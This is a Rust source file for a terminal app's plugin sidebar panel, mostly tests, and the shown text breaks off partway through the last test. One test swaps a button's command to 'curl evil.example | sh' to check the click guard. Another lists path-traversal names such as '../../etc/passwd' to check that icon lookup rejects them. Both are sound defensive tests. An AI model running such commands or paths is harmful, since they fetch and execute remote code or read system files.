//! A plugin's sidebar panel (spec 0016, Model; spec 0018, Body): Tern
//! draws the items the plugin sent, from a fixed set, and tells what the
//! user does in them. The plugin draws nothing itself, and nothing here is
//! a prompt of Tern's (TM-plug-02).
//!
//! Keys, with the keyboard in the panel: Up and Down walk the rows and
//! buttons, Enter acts on the selected one (on a stopped plugin's panel:
//! Restart), Tab moves between them and the input field.

use super::CLICK_GUARD;
use crate::plugins::command::{self, Command};
use crate::plugins::panel::{Control, Item, PanelModel};
use crate::plugins::{ListedPanel, Right};
use gpui::prelude::FluentBuilder;
use gpui::{
    AnyElement, App, AppContext, ClickEvent, Context, Entity, EventEmitter, FocusHandle,
    FollowMode, InteractiveElement, IntoElement, KeyBinding, ListAlignment, ListSizingBehavior,
    ListState, ParentElement, Render, SharedString, StatefulInteractiveElement, Styled, Task,
    Window, actions, div, list, px,
};
use gpui_component::button::{Button, ButtonVariants};
use gpui_component::input::{Input, InputEvent, InputState};
use gpui_component::{ActiveTheme, Disableable, Icon, IconName, Sizable};

/// Plain keys, bound only while the keyboard is on the panel's rows and
/// buttons.
const CONTEXT: &str = "PluginPanel";
/// How far past the visible rows a list lays out.
const OVERDRAW: f32 = 200.0;
/// The least height of a panel's log (spec 0018, Body).
const LOG_MIN_HEIGHT: f32 = 120.0;

actions!(plugin_panel, [SelectPrevious, SelectNext, Activate]);

pub fn init(cx: &mut App) {
    cx.bind_keys([
        KeyBinding::new("up", SelectPrevious, Some(CONTEXT)),
        KeyBinding::new("down", SelectNext, Some(CONTEXT)),
        KeyBinding::new("enter", Activate, Some(CONTEXT)),
    ]);
}

/// The icon a manifest names: one of the icons Tern embeds, by its
/// kebab-case name. Any other name, or none, gets the default plugin
/// icon; no image is ever read from a plugin (spec 0018, Icons).
pub fn icon(name: Option<&str>, cx: &App) -> Icon {
    let embedded = |path: &str| matches!(cx.asset_source().load(path), Ok(Some(_)));
    match icon_path(name, embedded) {
        Some(path) => Icon::default().path(path),
        None => IconName::Frame.into(),
    }
}

/// The asset path of the icon `name`, if it is a kebab-case name of an
/// icon that is `embedded`. A name is never a path of its own.
fn icon_path(name: Option<&str>, embedded: impl Fn(&str) -> bool) -> Option<String> {
    name.filter(|name| {
        name.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
    })
    .map(|name| format!("icons/{name}.svg"))
    .filter(|path| embedded(path))
}

pub enum PluginPanelEvent {
    /// The row or button with this `id` was clicked.
    Action(String),
    /// The input field was submitted with this text.
    Input(String),
    /// The command button `id` was clicked, and what it carries.
    Command { id: String, command: Command },
    /// Restart, on a stopped plugin's panel.
    Restart,
}

pub struct PluginPanel {
    focus: FocusHandle,
    model: PanelModel,
    items: ListState,
    log: ListState,
    input: Entity<InputState>,
    /// The row or button Up, Down and Enter act on, as an index into the
    /// model's controls.
    selected: Option<usize>,
    stopped: bool,
    rights: Vec<Right>,
    /// The terminal's font, which commands are shown in.
    font: SharedString,
    /// Running while command buttons ignore clicks: for [`CLICK_GUARD`]
    /// after the panel's contents changed, so a `set_panel` can't swap the
    /// command under a click (TM-plug-23).
    guard: Option<Task<()>>,
}

impl EventEmitter<PluginPanelEvent> for PluginPanel {}

impl PluginPanel {
    pub fn new(font: SharedString, window: &mut Window, cx: &mut Context<Self>) -> Self {
        let input = cx.new(|cx| InputState::new(window, cx));
        cx.subscribe_in(
            &input,
            window,
            |this, input, event: &InputEvent, window, cx| {
                if let InputEvent::PressEnter { .. } = event {
                    let text = input.read(cx).value().to_string();
                    input.update(cx, |input, cx| input.set_value("", window, cx));
                    if this.model.input().is_some() && !this.stopped {
                        cx.emit(PluginPanelEvent::Input(text));
                    }
                }
            },
        )
        .detach();
        let log = ListState::new(0, ListAlignment::Top, px(OVERDRAW));
        log.set_follow_mode(FollowMode::Tail);
        Self {
            focus: cx.focus_handle().tab_stop(true),
            model: PanelModel::default(),
            items: ListState::new(0, ListAlignment::Top, px(OVERDRAW)),
            log,
            input,
            selected: None,
            stopped: false,
            rights: Vec::new(),
            font,
            guard: None,
        }
    }

    /// Takes what the host says of the panel's plugin, and the terminal's
    /// font.
    pub fn set_state(&mut self, listed: &ListedPanel, font: SharedString, cx: &mut Context<Self>) {
        if self.stopped != listed.stopped || self.rights != listed.rights || self.font != font {
            self.stopped = listed.stopped;
            self.rights = listed.rights.clone();
            self.font = font;
            self.items.remeasure();
            cx.notify();
        }
    }

    /// `set_panel`: replaces the items.
    pub fn set_items(&mut self, items: Vec<Item>, window: &mut Window, cx: &mut Context<Self>) {
        if !self.model.set(items) {
            return;
        }
        self.items.reset(self.model.items().len());
        self.selected = None;
        if let Some(placeholder) = self.model.input() {
            let placeholder = placeholder.unwrap_or_default().to_owned();
            self.input.update(cx, |input, cx| {
                input.set_placeholder(placeholder, window, cx);
            });
        }
        self.guard_clicks(cx);
        cx.notify();
    }

    /// `append_log`: adds lines to the log.
    pub fn append_log(&mut self, text: &str, cx: &mut Context<Self>) {
        let before = self.model.log().len();
        let (added, dropped) = self.model.append(text);
        self.log.splice(before..before, added);
        self.log.splice(0..dropped, 0);
        cx.notify();
    }

    /// Puts the keyboard in the panel: its input field if it has one,
    /// else its rows and buttons.
    pub fn focus(&self, window: &mut Window, cx: &mut App) {
        if self.model.input().is_some() && !self.stopped {
            self.input.update(cx, |input, cx| input.focus(window, cx));
        } else {
            window.focus(&self.focus, cx);
        }
    }

    /// Whether command buttons ignore clicks right now.
    pub fn ignores_clicks(&self) -> bool {
        self.guard.is_some()
    }

    fn guard_clicks(&mut self, cx: &mut Context<Self>) {
        let wait = cx.background_executor().timer(CLICK_GUARD);
        self.guard = Some(cx.spawn(async move |this, cx| {
            wait.await;
            let _ = this.update(cx, |this, cx| {
                this.guard = None;
                cx.notify();
            });
        }));
    }

    fn holds(&self, command: &Command) -> bool {
        self.rights.contains(&command.right())
    }

    /// A click or Enter on `control`.
    fn activate(&mut self, control: Control, cx: &mut Context<Self>) {
        let event = match (control, self.model.items().get(control.item())) {
            (Control::Row(_), Some(Item::Row { id: Some(id), .. })) => {
                PluginPanelEvent::Action(id.clone())
            }
            (Control::RowButton(_, button), Some(Item::Row { buttons, .. })) => {
                match buttons.get(button) {
                    Some(button) => PluginPanelEvent::Action(button.id.clone()),
                    None => return,
                }
            }
            (Control::Button(_), Some(Item::Button { id, command, .. })) => match command {
                None => PluginPanelEvent::Action(id.clone()),
                Some(command) if self.holds(command) && !self.ignores_clicks() => {
                    PluginPanelEvent::Command {
                        id: id.clone(),
                        command: command.clone(),
                    }
                }
                Some(_) => return,
            },
            _ => return,
        };
        cx.emit(event);
    }

    /// Up and Down: the next row or button in direction `by`, kept in
    /// view.
    fn select(&mut self, by: isize, cx: &mut Context<Self>) {
        let controls = self.model.controls();
        if controls.is_empty() {
            return;
        }
        let last = controls.len() - 1;
        let next = match self.selected {
            Some(now) => now.saturating_add_signed(by).min(last),
            None if by < 0 => last,
            None => 0,
        };
        self.selected = Some(next);
        self.items.scroll_to_reveal_item(controls[next].item());
        cx.notify();
    }

    fn activate_selected(&mut self, cx: &mut Context<Self>) {
        if self.stopped {
            cx.emit(PluginPanelEvent::Restart);
        } else if let Some(control) = self
            .selected
            .and_then(|selected| self.model.controls().get(selected).copied())
        {
            self.activate(control, cx);
        }
    }

    /// Whether `control` is the selected one, with the keyboard in the
    /// panel.
    fn is_selected(&self, control: Control, focused: bool) -> bool {
        focused
            && self
                .selected
                .and_then(|selected| self.model.controls().get(selected).copied())
                == Some(control)
    }

    fn button(
        &self,
        control: Control,
        label: &str,
        focused: bool,
        cx: &mut Context<Self>,
    ) -> Button {
        let id = match control {
            Control::RowButton(item, button) => ("plugin-row-button", item * 1024 + button),
            _ => ("plugin-button", control.item()),
        };
        let button = Button::new(id).label(label.to_owned()).small();
        let button = if self.is_selected(control, focused) {
            button.primary()
        } else {
            button.outline()
        };
        button.on_click(cx.listener(move |this, _: &ClickEvent, _, cx| {
            // A row's button is not also a click on its row.
            cx.stop_propagation();
            this.activate(control, cx);
        }))
    }

    fn render_item(&self, ix: usize, window: &Window, cx: &mut Context<Self>) -> AnyElement {
        let focused = self.focus.is_focused(window);
        let theme = cx.theme();
        let (muted, active) = (theme.muted_foreground, theme.list_active);
        let block = div().px(px(8.)).py(px(3.)).min_w_0();
        match self.model.items().get(ix) {
            Some(Item::Text { text }) => block.text_sm().child(text.clone()).into_any_element(),
            Some(Item::Row {
                id,
                text,
                detail,
                buttons,
            }) => {
                let row = Control::Row(ix);
                let buttons: Vec<Button> = buttons
                    .iter()
                    .enumerate()
                    .map(|(button, shown)| {
                        self.button(Control::RowButton(ix, button), &shown.label, focused, cx)
                    })
                    .collect();
                block
                    .id(("plugin-row", ix))
                    .flex()
                    .flex_wrap()
                    .items_center()
                    .gap(px(6.))
                    .when(self.is_selected(row, focused), |block| block.bg(active))
                    .child(
                        div()
                            .flex_1()
                            .min_w_0()
                            .child(div().text_sm().child(text.clone()))
                            .children(
                                detail
                                    .clone()
                                    .map(|detail| div().text_xs().text_color(muted).child(detail)),
                            ),
                    )
                    .children(buttons)
                    .when(id.is_some(), |block| {
                        block.cursor_pointer().on_click(cx.listener(
                            move |this, _: &ClickEvent, _, cx| {
                                this.activate(row, cx);
                            },
                        ))
                    })
                    .into_any_element()
            }
            Some(Item::Button { label, command, .. }) => {
                let control = Control::Button(ix);
                let button = self.button(control, label, focused, cx);
                let Some(command) = command else {
                    return block.child(button).into_any_element();
                };
                // A command button: all of its command under the label,
                // never cut, and disabled without the command's right.
                let held = self.holds(command);
                let missing = (!held).then(|| {
                    let right = command.right().name();
                    div()
                        .text_xs()
                        .text_color(muted)
                        .child(format!("Needs the `{right}` right, which isn't granted"))
                });
                block
                    .flex()
                    .flex_col()
                    .items_start()
                    .gap(px(3.))
                    .child(button.disabled(!held))
                    .child(command::shown(command, self.font.clone(), cx))
                    .children(missing)
                    .into_any_element()
            }
            Some(Item::Input { .. }) => block
                .child(Input::new(&self.input).small())
                .into_any_element(),
            Some(Item::Log) | None => div().into_any_element(),
        }
    }

    fn render_log_line(&self, ix: usize) -> AnyElement {
        let line = self.model.log().get(ix).cloned().unwrap_or_default();
        div()
            .px(px(8.))
            .min_w_0()
            .text_xs()
            .font_family(self.font.clone())
            // An empty line keeps its height.
            .child(if line.is_empty() { " ".into() } else { line })
            .into_any_element()
    }

    /// What a stopped plugin's panel shows in place of its items (spec
    /// 0016, flow 6).
    fn render_stopped(&self, cx: &mut Context<Self>) -> AnyElement {
        div()
            .flex()
            .flex_col()
            .items_start()
            .gap(px(8.))
            .px(px(8.))
            .py(px(8.))
            .child(
                div()
                    .text_sm()
                    .text_color(cx.theme().muted_foreground)
                    .child("This plugin has stopped."),
            )
            .child(
                Button::new("plugin-restart")
                    .label("Restart")
                    .primary()
                    .small()
                    .on_click(cx.listener(|_, _: &ClickEvent, _, cx| {
                        cx.emit(PluginPanelEvent::Restart);
                    })),
            )
            .into_any_element()
    }
}

impl Render for PluginPanel {
    fn render(&mut self, _: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        let body = if self.stopped {
            self.render_stopped(cx)
        } else {
            let items = list(
                self.items.clone(),
                cx.processor(|this, ix: usize, window, cx| this.render_item(ix, window, cx)),
            );
            let Some(log) = self.model.has_log().then(|| self.log.clone()) else {
                return self.framed(items.size_full().into_any_element(), cx);
            };
            // The items take what they need and the log the rest, at
            // least its minimum; with more items than fit, they scroll.
            div()
                .size_full()
                .flex()
                .flex_col()
                .child(
                    div().flex_shrink_1().min_h_0().child(
                        items
                            .with_sizing_behavior(ListSizingBehavior::Infer)
                            .max_h_full(),
                    ),
                )
                .child(
                    div()
                        .flex_1()
                        .min_h(px(LOG_MIN_HEIGHT))
                        .border_t_1()
                        .border_color(cx.theme().border)
                        .child(
                            list(
                                log,
                                cx.processor(|this, ix: usize, _, _| this.render_log_line(ix)),
                            )
                            .size_full(),
                        ),
                )
                .into_any_element()
        };
        self.framed(body, cx)
    }
}

impl PluginPanel {
    /// The panel's surface around `body`: its keys, and its focus.
    fn framed(&self, body: AnyElement, cx: &mut Context<Self>) -> AnyElement {
        div()
            .key_context(CONTEXT)
            .track_focus(&self.focus)
            // As the sidebar's own surface: a press on the panel leaves
            // the keyboard with the shell.
            .on_any_mouse_down(|_, window, _| window.prevent_default())
            .on_action(cx.listener(|this, _: &SelectPrevious, _, cx| this.select(-1, cx)))
            .on_action(cx.listener(|this, _: &SelectNext, _, cx| this.select(1, cx)))
            .on_action(cx.listener(|this, _: &Activate, window, cx| {
                // Enter in the input field is the field's own.
                if this.focus.is_focused(window) {
                    this.activate_selected(cx);
                } else {
                    cx.propagate();
                }
            }))
            .size_full()
            .child(body)
            .into_any_element()
    }
}

/// Spec 0016 §Model (Command buttons), flow 6 and AC10; spec 0018 (Body,
/// "The keyboard stays with the shell"); threat model 0005, TM-plug-02 and
/// -23. The panel is drawn in a test window, as wide as the sidebar starts
/// out, and clicked and typed in like the running app.
#[cfg(test)]
mod tests {
    use super::*;
    use crate::plugins::panel::RowButton;
    use crate::sidebar::WIDTH;
    use gpui::{Modifiers, Pixels, Point, TestAppContext, VisualTestContext, point};
    use std::cell::RefCell;
    use std::rc::Rc;
    use std::time::Duration;

    /// What the panel told its plugin's host, as a test compares it.
    #[derive(Clone, Debug, PartialEq)]
    enum Got {
        Action(String),
        Input(String),
        Command(String, Command),
        Restart,
    }

    /// Stands in for the sidebar and the workspace: the panel in a column
    /// beside a pane that holds the keyboard.
    struct Host {
        pane: FocusHandle,
        panel: Entity<PluginPanel>,
    }

    impl Render for Host {
        fn render(&mut self, _: &mut Window, _: &mut Context<Self>) -> impl IntoElement {
            div()
                .size_full()
                .flex()
                .child(
                    div()
                        .w(px(WIDTH))
                        .h_full()
                        .flex_shrink_0()
                        .child(self.panel.clone()),
                )
                .child(div().track_focus(&self.pane).flex_1().h_full())
        }
    }

    struct Rig<'a> {
        panel: Entity<PluginPanel>,
        pane: FocusHandle,
        got: Rc<RefCell<Vec<Got>>>,
        cx: &'a mut VisualTestContext,
    }

    /// An empty panel of a running plugin that holds `terminal_write`,
    /// drawn, with the keyboard in the pane.
    fn rig(cx: &mut TestAppContext) -> Rig<'_> {
        cx.update(|cx| {
            gpui_component::init(cx);
            init(cx);
        });
        let made = Rc::new(RefCell::new(None));
        let (_, cx) = cx.add_window_view({
            let made = made.clone();
            move |window, cx| {
                let panel = cx.new(|cx| PluginPanel::new("monospace".into(), window, cx));
                let host = cx.new(|cx| Host {
                    pane: cx.focus_handle(),
                    panel,
                });
                *made.borrow_mut() = Some(host.clone());
                gpui_component::Root::new(host, window, cx)
            }
        });
        let host = made.take().expect("the window built the host");
        let got = Rc::new(RefCell::new(Vec::new()));
        let (panel, pane) = cx.update(|window, cx| {
            let (panel, pane) = {
                let host = host.read(cx);
                (host.panel.clone(), host.pane.clone())
            };
            window.focus(&pane, cx);
            let got = got.clone();
            cx.subscribe(&panel, move |_, event: &PluginPanelEvent, _| {
                got.borrow_mut().push(match event {
                    PluginPanelEvent::Action(id) => Got::Action(id.clone()),
                    PluginPanelEvent::Input(text) => Got::Input(text.clone()),
                    PluginPanelEvent::Command { id, command } => {
                        Got::Command(id.clone(), command.clone())
                    }
                    PluginPanelEvent::Restart => Got::Restart,
                });
            })
            .detach();
            (panel, pane)
        });
        let mut rig = Rig {
            panel,
            pane,
            got,
            cx,
        };
        rig.state(false, &[Right::TerminalWrite]);
        rig
    }

    impl Rig<'_> {
        fn draw(&mut self) {
            self.cx.run_until_parked();
            self.cx.update(|window, cx| window.draw(cx).clear(cx));
            self.cx.run_until_parked();
        }

        /// What the host says of the panel's plugin.
        fn state(&mut self, stopped: bool, rights: &[Right]) {
            let listed = ListedPanel {
                plugin: "docker".into(),
                name: "Docker".into(),
                panel: "containers".into(),
                title: "Containers".into(),
                icon: None,
                stopped,
                rights: rights.to_vec(),
            };
            self.panel.update(self.cx, |panel, cx| {
                panel.set_state(&listed, "monospace".into(), cx);
            });
            self.draw();
        }

        /// The plugin's `set_panel`.
        fn set(&mut self, items: Vec<Item>) {
            self.panel.update_in(self.cx, |panel, window, cx| {
                panel.set_items(items, window, cx);
            });
            self.draw();
        }

        /// The events since the last call.
        fn got(&mut self) -> Vec<Got> {
            std::mem::take(&mut *self.got.borrow_mut())
        }

        fn ignores_clicks(&mut self) -> bool {
            self.panel
                .read_with(self.cx, |panel, _| panel.ignores_clicks())
        }

        /// Lets `time` pass on the test clock.
        fn wait(&mut self, time: Duration) {
            self.cx.executor().advance_clock(time);
            self.draw();
        }

        fn click(&mut self, at: Point<Pixels>) -> Vec<Got> {
            self.cx.simulate_click(at, Modifiers::none());
            self.draw();
            self.got()
        }

        /// Presses `keys`.
        fn keys(&mut self, keys: &str) -> Vec<Got> {
            self.draw();
            self.cx.simulate_keystrokes(keys);
            self.draw();
            self.got()
        }

        /// `sidebar.focus`: the keyboard goes into the panel.
        fn focus(&mut self) {
            self.panel
                .update_in(self.cx, |panel, window, cx| panel.focus(window, cx));
            self.draw();
        }

        fn pane_has_the_keyboard(&mut self) -> bool {
            let pane = self.pane.clone();
            self.cx.update(|window, _| pane.is_focused(window))
        }

        /// Clicks all over the panel, top to bottom: its items carry no
        /// test selector. Returns each click that told something, with
        /// what it told.
        fn sweep(&mut self) -> Vec<(Point<Pixels>, Vec<Got>)> {
            self.got();
            let mut told = Vec::new();
            for y in (3..300).step_by(6) {
                for x in (8..WIDTH as i32).step_by(16) {
                    let at = point(px(x as f32), px(y as f32));
                    // A click that tells nothing moves nothing, so the
                    // frame it was drawn in stands for the next one.
                    self.cx.simulate_click(at, Modifiers::none());
                    let got = self.got();
                    if !got.is_empty() {
                        self.draw();
                        told.push((at, got));
                    }
                }
            }
            told
        }

        /// A point where a click tells `wanted`.
        fn where_a_click_tells(&mut self, wanted: &Got) -> Point<Pixels> {
            let told = self.sweep();
            let hit = told.iter().find(|(_, got)| got.contains(wanted));
            let (at, _) = hit.unwrap_or_else(|| panic!("no click told {wanted:?}: {told:?}"));
            *at
        }
    }

    fn text(text: &str) -> Item {
        Item::Text { text: text.into() }
    }

    fn row(id: Option<&str>, text: &str, buttons: &[&str]) -> Item {
        Item::Row {
            id: id.map(str::to_owned),
            text: text.into(),
            detail: Some("Up 2 h".into()),
            buttons: buttons
                .iter()
                .map(|id| RowButton {
                    id: (*id).to_owned(),
                    label: "Go".into(),
                })
                .collect(),
        }
    }

    fn button(id: &str, label: &str, command: Option<Command>) -> Item {
        Item::Button {
            id: id.into(),
            label: label.into(),
            command,
        }
    }

    fn fill(text: &str) -> Command {
        Command::Fill { text: text.into() }
    }

    fn action(id: &str) -> Got {
        Got::Action(id.into())
    }

    /// One of everything a panel can hold; `command` is on the button
    /// `ps`.
    fn everything(command: Command) -> Vec<Item> {
        vec![
            text("3 running"),
            row(Some("web"), "web", &["web.restart"]),
            button("refresh", "Refresh", None),
            button("ps", "List containers", Some(command)),
            Item::Input {
                placeholder: Some("Filter".into()),
            },
            Item::Log,
        ]
    }

    /// Spec 0016, Events and TM-plug-02: "`panel_action` (a button or row
    /// was clicked)": a click on a row that has an `id`, on a row's button
    /// or on a plain button tells that `id`, and a command button its `id`
    /// with the command it shows. Text, the input field and the log tell
    /// nothing, and nothing else is ever told.
    #[gpui::test]
    fn a_click_on_a_row_or_a_button_tells_its_id(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(everything(fill("docker ps")));
        rig.panel
            .update(rig.cx, |panel, cx| panel.append_log("pulling\nstarted", cx));
        rig.wait(CLICK_GUARD);

        let mut distinct: Vec<Got> = Vec::new();
        for got in rig.sweep().into_iter().flat_map(|(_, got)| got) {
            if !distinct.contains(&got) {
                distinct.push(got);
            }
        }
        let expected = [
            action("web"),
            action("web.restart"),
            action("refresh"),
            Got::Command("ps".into(), fill("docker ps")),
        ];
        for wanted in &expected {
            assert!(distinct.contains(wanted), "no click told {wanted:?}");
        }
        assert_eq!(distinct.len(), expected.len(), "{distinct:?}");
    }

    /// Spec 0016, Events: `panel_action` is "a button or row was clicked",
    /// and a row's button has an `id` of its own: a click on it tells that
    /// `id` and not the row's as well, or "Restart" on a row would also do
    /// whatever a click on the row does.
    #[gpui::test]
    fn a_click_tells_one_thing(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(everything(fill("docker ps")));
        rig.wait(CLICK_GUARD);
        let told = rig.sweep();
        assert!(!told.is_empty());
        for (at, got) in told {
            assert_eq!(got.len(), 1, "the click at {at:?} told {got:?}");
        }
    }

    /// Spec 0018, Icons; TM-plug-01: an icon is "one of the icons the
    /// embedded bundle holds … named in kebab-case. Any other name, or
    /// none, gets the default plugin icon. No image is read from a
    /// plugin": a name that isn't kebab-case is never looked up, so it
    /// never becomes a path, whatever the bundle would say to it.
    #[test]
    fn only_an_embedded_kebab_case_name_becomes_an_icons_path() {
        let asked = RefCell::new(Vec::new());
        // A bundle that holds two icons; `everything` one that would say
        // yes to any path it is asked for.
        let bundle = |path: &str| {
            asked.borrow_mut().push(path.to_owned());
            ["icons/container.svg", "icons/scroll-text.svg"].contains(&path)
        };
        let everything = |path: &str| {
            asked.borrow_mut().push(path.to_owned());
            true
        };

        for name in ["container", "scroll-text"] {
            let path = icon_path(Some(name), bundle);
            assert_eq!(path, Some(format!("icons/{name}.svg")));
        }
        assert_eq!(icon_path(Some("no-such-icon"), bundle), None);
        assert_eq!(icon_path(None, bundle), None);
        assert_eq!(icon_path(None, everything), None);

        asked.borrow_mut().clear();
        let not_names = [
            "../../etc/passwd",
            "..",
            "icons/container",
            "/etc/passwd",
            "sub/container",
            "back\\slash",
            "container.svg",
            "container.",
            ".hidden",
            "Container",
            "SCROLL-TEXT",
            "scroll_text",
            "scroll text",
            "containér",
            "container\0",
        ];
        for name in not_names {
            assert_eq!(icon_path(Some(name), everything), None, "{name:?}");
        }
        assert_eq!(
            *asked.borrow(),
            [""; 0],
            "a name that is no name was looked up"
        );
    }

    /// Spec 0016, Command buttons [load-bearing], AC10 and TM-plug-23: "A
    /// command button ignores clicks for 0.5 s after its panel's contents
    /// changed, so a `set_panel` can't swap the command under a click."
    /// After the 0.5 s the click tells the command the button shows now.
    /// A `set_panel` with the items the panel already has changes nothing,
    /// so it starts no 0.5 s.
    #[gpui::test]
    fn a_command_button_ignores_clicks_for_half_a_second_after_its_panel_changed(
        cx: &mut TestAppContext,
    ) {
        let mut rig = rig(cx);
        let listing = Got::Command("ps".into(), fill("docker ps"));
        rig.set(everything(fill("docker ps")));
        assert!(
            rig.ignores_clicks(),
            "a first `set_panel` changes the panel"
        );
        rig.wait(CLICK_GUARD);
        assert!(!rig.ignores_clicks());
        let at = rig.where_a_click_tells(&listing);

        // The same label over another command, just before the click.
        let swapped = fill("curl evil.example | sh");
        rig.set(everything(swapped.clone()));
        assert_eq!(rig.click(at), [], "a click right after the swap");
        rig.wait(Duration::from_millis(499));
        assert_eq!(rig.click(at), [], "a click 499 ms after the swap");
        rig.wait(Duration::from_millis(1));
        assert_eq!(
            rig.click(at),
            [Got::Command("ps".into(), swapped.clone())],
            "a click 0.5 s after the swap"
        );

        // The plugin sends the same items again, as one that refreshes on
        // a timer does.
        rig.set(everything(swapped.clone()));
        assert!(
            !rig.ignores_clicks(),
            "nothing changed, yet clicks are ignored"
        );
        assert_eq!(rig.click(at), [Got::Command("ps".into(), swapped)]);

        // A change anywhere in the panel counts: the button may have moved.
        let mut moved = everything(fill("docker ps"));
        moved[0] = text("4 running");
        rig.set(moved);
        assert!(rig.ignores_clicks());
        assert_eq!(rig.click(at), []);
        rig.wait(CLICK_GUARD);
        assert_eq!(rig.click(at), [listing]);
    }

    /// Command buttons: a button without a command only sends
    /// `panel_action` to its own plugin (TM-plug-02), so the 0.5 s isn't
    /// its: it acts right after a `set_panel`, as a row does.
    #[gpui::test]
    fn a_plain_button_and_a_row_act_right_after_the_panel_changed(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(everything(fill("docker ps")));
        let told = rig.sweep();
        let all: Vec<&Got> = told.iter().flat_map(|(_, got)| got).collect();
        for wanted in [action("web"), action("web.restart"), action("refresh")] {
            assert!(all.contains(&&wanted), "no click told {wanted:?}");
        }
        let commands = all.iter().filter(|got| matches!(got, Got::Command(..)));
        assert_eq!(commands.count(), 0, "a command within the 0.5 s");
    }

    /// Command buttons [load-bearing], AC10: a command button "needs the
    /// same right as the action; without it the button is drawn disabled":
    /// a click does nothing, however long the panel has been there, and
    /// acts once the right is ticked. `terminal_write` is no right to
    /// open a tab.
    #[gpui::test]
    fn a_command_button_without_its_right_does_nothing(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        let typed = fill("docker ps");
        let opened = Command::OpenTab {
            argv: vec!["docker".into(), "exec".into(), "-it".into(), "web".into()],
        };
        rig.set(vec![
            button("ps", "List", Some(typed.clone())),
            button("sh", "Shell", Some(opened.clone())),
        ]);
        let (list, shell) = (
            Got::Command("ps".into(), typed),
            Got::Command("sh".into(), opened),
        );
        // What the clicks all over the panel tell with `rights` ticked,
        // long after the panel last changed.
        let mut told_with = |rights: &[Right]| {
            rig.state(false, rights);
            rig.wait(CLICK_GUARD);
            let mut distinct: Vec<Got> = Vec::new();
            for got in rig.sweep().into_iter().flat_map(|(_, got)| got) {
                if !distinct.contains(&got) {
                    distinct.push(got);
                }
            }
            distinct
        };

        assert_eq!(told_with(&[]), [], "commands without any right");
        assert_eq!(
            told_with(&[Right::TerminalWrite]),
            std::slice::from_ref(&list)
        );
        assert_eq!(told_with(&[Right::OpenTab]), std::slice::from_ref(&shell));
        // `terminal_read` and `pane_info` are no right to type or open.
        assert_eq!(told_with(&[Right::TerminalRead, Right::PaneInfo]), []);
        assert_eq!(
            told_with(&[Right::TerminalWrite, Right::OpenTab]),
            [list, shell]
        );
    }

    /// Spec 0018, "The keyboard stays with the shell" [load-bearing]: the
    /// panel "binds plain keys (arrows, Enter…), so they exist only while
    /// focus is inside it". There, Up and Down walk the rows and buttons
    /// top to bottom and Enter acts on the selected one, as a click does
    /// (keyboard first: every action has a key).
    #[gpui::test]
    fn up_and_down_walk_the_rows_and_buttons_and_enter_acts_on_the_selected_one(
        cx: &mut TestAppContext,
    ) {
        let mut rig = rig(cx);
        rig.set(vec![
            text("3 running"),
            row(Some("web"), "web", &["web.restart", "web.logs"]),
            row(None, "db", &["db.restart"]),
            button("refresh", "Refresh", None),
            button("ps", "List", Some(fill("docker ps"))),
            Item::Log,
        ]);
        rig.wait(CLICK_GUARD);

        // In the pane, the keys are the shell's.
        assert_eq!(rig.keys("down enter up enter"), []);
        assert!(rig.pane_has_the_keyboard());

        rig.focus();
        assert!(!rig.pane_has_the_keyboard(), "`focus` left the keyboard");
        assert_eq!(rig.keys("enter"), [], "Enter with nothing selected");
        let walk = [
            action("web"),
            action("web.restart"),
            action("web.logs"),
            action("db.restart"),
            action("refresh"),
            Got::Command("ps".into(), fill("docker ps")),
        ];
        for expected in &walk {
            assert_eq!(rig.keys("down enter"), std::slice::from_ref(expected));
        }
        for expected in walk.iter().rev().skip(1) {
            assert_eq!(rig.keys("up enter"), std::slice::from_ref(expected));
        }
    }

    /// Command buttons, TM-plug-23: Enter on a command button is a click
    /// on it, so it is ignored for the same 0.5 s and without the right.
    #[gpui::test]
    fn enter_on_a_command_button_is_held_to_the_rules_of_a_click(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(vec![button("ps", "List", Some(fill("docker ps")))]);
        rig.focus();
        assert_eq!(rig.keys("down enter"), [], "Enter right after `set_panel`");
        rig.wait(CLICK_GUARD);
        let listing = Got::Command("ps".into(), fill("docker ps"));
        assert_eq!(rig.keys("enter"), [listing]);

        rig.state(false, &[]);
        rig.wait(CLICK_GUARD);
        assert_eq!(rig.keys("enter"), [], "Enter without the right");
    }

    /// Spec 0016, Events: "`panel_input` (the panel's input field was
    /// submitted)": with the keyboard in the panel, typing goes to its
    /// input field and Enter tells the text, once.
    #[gpui::test]
    fn submitting_the_input_field_tells_its_text(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(everything(fill("docker ps")));
        rig.focus();
        assert!(!rig.pane_has_the_keyboard());
        rig.cx.simulate_input("nginx é");
        assert_eq!(rig.keys("enter"), [Got::Input("nginx é".into())]);
    }

    /// Spec 0018, "The keyboard stays with the shell" [load-bearing]: "a
    /// plugin filling a panel" never moves keyboard focus, whatever it
    /// fills it with (TM-plug-02: a panel with an input field can't catch
    /// typing meant for a shell).
    #[gpui::test]
    fn a_plugin_filling_its_panel_leaves_the_keyboard_in_the_pane(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(everything(fill("docker ps")));
        assert!(rig.pane_has_the_keyboard(), "`set_panel` took the keyboard");
        rig.panel
            .update(rig.cx, |panel, cx| panel.append_log("a\nb", cx));
        rig.draw();
        rig.set(vec![Item::Input { placeholder: None }]);
        rig.state(true, &[]);
        rig.state(false, &[Right::TerminalWrite]);
        assert!(rig.pane_has_the_keyboard());
        rig.cx.simulate_input("ls");
        assert_eq!(rig.keys("enter"), [], "typing meant for the shell");
    }

    /// Spec 0016, flow 6 and AC9; spec 0018, Body: a stopped plugin's
    /// panel shows "stopped" with Restart "as the body": a click on it, or
    /// Enter with the keyboard in the panel, asks for Restart, and nothing
    /// in the panel tells the stopped plugin an action or an input.
    #[gpui::test]
    fn a_stopped_plugins_panel_offers_restart_and_nothing_else(cx: &mut TestAppContext) {
        let mut rig = rig(cx);
        rig.set(everything(fill("docker ps")));
        rig.wait(CLICK_GUARD);
        rig.state(true, &[Right::TerminalWrite]);

        let told = rig.sweep();
        assert!(!told.is_empty(), "no click asked for Restart");
        for (at, got) in told {
            assert_eq!(got, [Got::Restart], "the click at {at:?}");
        }

        // Back in the pane after the clicks: plain keys aren't the panel's.
